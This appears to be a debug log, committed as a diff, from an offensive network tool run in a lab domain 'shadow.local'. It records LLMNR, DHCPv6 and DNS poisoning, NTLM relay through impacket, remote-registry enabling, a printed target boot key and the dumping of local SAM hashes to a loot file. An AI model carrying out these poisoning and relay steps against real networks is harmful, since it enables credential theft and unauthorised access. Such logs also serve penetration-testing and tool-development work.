+2022-01-16 18:32:29.631 | INFO     | project.network.poison.poisonengine.poisoners.llmnr:start_llmnr_poisoning:156 - Starting llmnr poisoning...
+2022-01-16 18:32:33.709 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_llmnr:106 - Running llmnr poisoning in the background
+2022-01-16 18:34:24.630 | WARNING  | project.network.poison.poisonselector:__checking_conditions_for_attack:92 - The attack is already running in the background
+2022-01-16 18:34:36.706 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-16 18:34:47.004 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-4: Connection from SHADOW/IRON@192.168.253.139 controlled, attacking target smb://192.168.253.138
+2022-01-16 18:34:47.234 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.138 as SHADOW/IRON SUCCEED
+2022-01-16 18:34:47.244 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-4: Connection from SHADOW/IRON@192.168.253.139 controlled, but there are no more targets left!
+2022-01-16 18:34:47.352 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2022-01-16 18:34:47.373 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is disabled, enabling it
+2022-01-16 18:34:47.390 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2022-01-16 18:34:48.528 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0x2300995ed1ba51a87969b344c1be1bc9
+2022-01-16 18:34:48.617 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2022-01-16 18:34:49.352 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.138
+2022-01-16 18:34:49.369 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2022-01-16 18:34:49.375 | INFO     | impacket.examples.secretsdump:finish:725 - Restoring the disabled state for service RemoteRegistry
+2022-01-16 18:34:55.109 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-6: Connection from SHADOW/IRON@192.168.253.139 controlled, but there are no more targets left!
+2022-01-16 18:34:56.600 | WARNING  | project.network.mitm.ntlmrelay:__synchronous_attack:165 - Exiting ntlm relay attack ...
+2022-01-16 18:35:03.225 | INFO     | project.network.mitm.ntlmrelay:__wrapper_attack:306 - Running ntlm relay in the background the results will be saved at: /home/rsgbengi/Igris/loot/192.168.253.138_samhashes.sam 
+2022-01-16 18:35:03.250 | INFO     | project.network.mitm.servers.smbserver:start_smb_relay_server:127 - Setting up SMB Server
+2022-01-16 18:35:03.285 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-16 18:35:10.982 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-5: Connection from SHADOW/IRON@192.168.253.139 controlled, attacking target smb://192.168.253.138
+2022-01-16 18:35:11.060 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.138 as SHADOW/IRON SUCCEED
+2022-01-16 18:35:11.071 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-5: Connection from SHADOW/IRON@192.168.253.139 controlled, but there are no more targets left!
+2022-01-16 18:35:11.147 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2022-01-16 18:35:11.166 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is disabled, enabling it
+2022-01-16 18:35:11.177 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2022-01-16 18:35:12.350 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0x2300995ed1ba51a87969b344c1be1bc9
+2022-01-16 18:35:12.416 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2022-01-16 18:35:12.989 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.138
+2022-01-16 18:35:12.993 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2022-01-16 18:35:12.996 | INFO     | impacket.examples.secretsdump:finish:725 - Restoring the disabled state for service RemoteRegistry
+2022-01-16 18:35:20.159 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from SHADOW/IRON@192.168.253.139 controlled, but there are no more targets left!
+2022-01-16 18:35:22.173 | SUCCESS  | project.network.mitm.ntlmrelay:__ends_ntlm_relay:328 - Finishing ntlm relay attack in the background ...
+2022-01-16 18:35:56.378 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:70 - Finishing attack in the background ...
+2022-01-16 18:36:02.950 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dhcp6:120 - Running dhcp6 poisoning in the background
+2022-01-16 18:36:11.808 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-16 18:36:35.073 | WARNING  | project.network.mitm.ntlmrelay:__synchronous_attack:165 - Exiting ntlm relay attack ...
+2022-01-16 18:36:38.534 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dns:134 - Running dns poisoning in the background
+2022-01-16 18:36:44.041 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-16 18:37:56.901 | WARNING  | project.network.mitm.ntlmrelay:__synchronous_attack:165 - Exiting ntlm relay attack ...
+2022-01-16 18:38:23.307 | SUCCESS  | project.network.poison.dnstakeover:__end_process_in_the_background:50 - Finishing attack in the background ...
+2022-01-16 18:39:06.883 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dhcp6:120 - Running dhcp6 poisoning in the background
+2022-01-16 18:39:16.419 | SUCCESS  | project.network.poison.dnstakeover:__end_process_in_the_background:50 - Finishing attack in the background ...
+2022-01-16 18:39:23.483 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:start_dhcp6_poisoning:188 - Starting dhcp6 rogue to attack shadow.local.
+2022-01-16 18:39:43.337 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:109 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 18:39:43.340 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:141 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 18:39:44.348 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:115 - [36m(DHCP6)Capturing REQUEST packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 18:39:44.350 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:146 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 18:40:20.002 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dns:134 - Running dns poisoning in the background
+2022-01-16 18:40:22.940 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-16 18:41:03.073 | WARNING  | project.network.mitm.ntlmrelay:__synchronous_attack:165 - Exiting ntlm relay attack ...
+2022-01-16 18:41:13.904 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dhcp6:120 - Running dhcp6 poisoning in the background
+2022-01-16 18:41:19.326 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dns:134 - Running dns poisoning in the background
+2022-01-16 18:41:22.649 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-16 18:44:00.144 | WARNING  | project.network.mitm.ntlmrelay:__synchronous_attack:165 - Exiting ntlm relay attack ...
+2022-01-16 18:44:14.664 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dhcp6:120 - Running dhcp6 poisoning in the background
+2022-01-16 18:44:21.834 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dns:134 - Running dns poisoning in the background
+2022-01-16 18:44:26.969 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-16 18:45:43.176 | WARNING  | project.network.mitm.ntlmrelay:__synchronous_attack:165 - Exiting ntlm relay attack ...
+2022-01-16 19:06:06.340 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dhcp6:120 - Running dhcp6 poisoning in the background
+2022-01-16 19:13:42.607 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:start_dhcp6_poisoning:188 - Starting dhcp6 rogue to attack shadow.local.
+2022-01-16 19:13:46.985 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dhcp6:120 - Running dhcp6 poisoning in the background
+2022-01-16 19:13:59.045 | SUCCESS  | project.network.poison.dnstakeover:__end_process_in_the_background:58 - Finishing attack in the background ...
+2022-01-16 19:14:19.085 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:start_dhcp6_poisoning:188 - Starting dhcp6 rogue to attack shadow.local.
+2022-01-16 19:14:44.538 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:start_dhcp6_poisoning:188 - Starting dhcp6 rogue to attack shadow.local.
+2022-01-16 19:15:06.141 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dhcp6:120 - Running dhcp6 poisoning in the background
+2022-01-16 19:17:14.724 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dhcp6:120 - Running dhcp6 poisoning in the background
+2022-01-16 19:17:14.726 | INFO     | project.network.poison.dnstakeover:__launch_attack:49 - hola
+2022-01-16 19:17:27.638 | SUCCESS  | project.network.poison.dnstakeover:__end_process_in_the_background:58 - Finishing attack in the background ...
+2022-01-16 19:17:40.010 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:start_dhcp6_poisoning:188 - Starting dhcp6 rogue to attack shadow.local.
+2022-01-16 19:17:40.011 | INFO     | project.network.poison.dnstakeover:__launch_attack:49 - hola
+2022-01-16 19:18:00.160 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:109 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 19:18:00.167 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:141 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 19:18:01.149 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:115 - [36m(DHCP6)Capturing REQUEST packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 19:18:01.153 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:146 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 19:20:21.983 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dhcp6:120 - Running dhcp6 poisoning in the background
+2022-01-16 19:20:27.997 | SUCCESS  | project.network.poison.dnstakeover:__end_process_in_the_background:57 - Finishing attack in the background ...
+2022-01-16 19:20:36.271 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:start_dhcp6_poisoning:188 - Starting dhcp6 rogue to attack shadow.local.
+2022-01-16 19:20:53.624 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:109 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 19:20:53.627 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:141 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 19:20:54.638 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:115 - [36m(DHCP6)Capturing REQUEST packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 19:20:54.641 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:146 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 19:21:04.342 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:109 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 19:21:04.344 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:141 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 19:21:05.345 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:115 - [36m(DHCP6)Capturing REQUEST packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 19:21:05.348 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:146 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-16 19:21:59.799 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dhcp6:120 - Running dhcp6 poisoning in the background
+2022-01-16 19:23:00.870 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_dns:134 - Running dns poisoning in the background
+2022-01-16 19:23:05.472 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-16 19:23:09.109 | WARNING  | project.network.mitm.ntlmrelay:__synchronous_attack:165 - Exiting ntlm relay attack ...
+2022-01-16 19:23:11.414 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-16 19:23:34.677 | WARNING  | project.network.mitm.ntlmrelay:__synchronous_attack:165 - Exiting ntlm relay attack ...
+2022-01-16 19:23:59.241 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-16 19:25:47.037 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-10: Connection from SHADOW/ADFDF@::ffff:192.168.253.139 controlled, attacking target smb://192.168.253.138
+2022-01-16 19:25:47.127 | ERROR    | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.138 as SHADOW/ADFDF FAILED
+2022-01-16 19:26:20.792 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-18: Connection from SHADOW/IRON@::ffff:192.168.253.139 controlled, attacking target smb://192.168.253.138
+2022-01-16 19:26:20.920 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.138 as SHADOW/IRON SUCCEED
+2022-01-16 19:26:20.934 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-18: Connection from SHADOW/IRON@::ffff:192.168.253.139 controlled, but there are no more targets left!
+2022-01-16 19:26:21.063 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2022-01-16 19:26:21.095 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is disabled, enabling it
+2022-01-16 19:26:21.116 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2022-01-16 19:26:22.304 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0x2300995ed1ba51a87969b344c1be1bc9
+2022-01-16 19:26:22.455 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2022-01-16 19:26:23.836 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.138
+2022-01-16 19:26:23.843 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2022-01-16 19:26:23.851 | INFO     | impacket.examples.secretsdump:finish:725 - Restoring the disabled state for service RemoteRegistry
+2022-01-16 19:26:31.843 | WARNING  | project.network.mitm.ntlmrelay:__synchronous_attack:165 - Exiting ntlm relay attack ...
